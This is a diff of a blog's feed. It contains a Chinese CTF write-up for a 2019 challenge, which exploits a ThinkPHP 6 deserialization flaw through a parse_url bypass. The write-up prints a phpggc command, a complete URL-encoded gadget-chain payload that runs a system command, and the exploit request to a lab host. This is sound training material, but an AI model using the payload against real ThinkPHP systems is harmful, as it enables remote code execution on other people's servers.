@@ -41,7 +41,7 @@
     <link href="https://kinsey973.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/"/>
     <id>https://kinsey973.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/</id>
     <published>2024-09-23T14:00:31.000Z</published>
-    <updated>2024-09-23T14:29:39.369Z</updated>
+    <updated>2024-09-24T07:13:23.370Z</updated>
     
     <content type="html"><![CDATA[<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p>我们扫描目录能发现一个<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409232201973.png" alt="image-20240923220135671" loading="lazy"></p><p>我们进行访问</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409232205410.png" alt="image-20240923220531335" loading="lazy"></p><p>发现这是topthink框架，也就是thinkphp框架</p><p>我们在index.php里发现一个unserialize反序列化，不出意外的话，这道题考的是反序列化</p><p>但我们发现前面还有个正则匹配，我们需要绕过parse_url</p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url小结</a></p><p>接下来就是找利用链了，这里懒得自己找了，上网搜了一波thinkphp6反序列化漏洞，这里我是看了这个<a href="https://xz.aliyun.com/t/6479">文章</a>,照着他的思路过了一遍源代码，确认他没有修改源代码，就可以利用了，这个链有大佬已经放到了phpggc上，直接生成就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php  phpggc ThinkPHP/RCE3 system &#x27;cat /flag&#x27; --url</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>然后我们访问public，在进行传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://f6978a90-3d95-4f01-baba-7bcb4d454e24.node5.buuoj.cn:81///public/?payload=O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
     
@@ -53,6 +53,10 @@
     
     
     
+    <category term="刷题笔记" scheme="https://kinsey973.github.io/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="thinkphp" scheme="https://kinsey973.github.io/tags/thinkphp/"/>
     
   </entry>
   
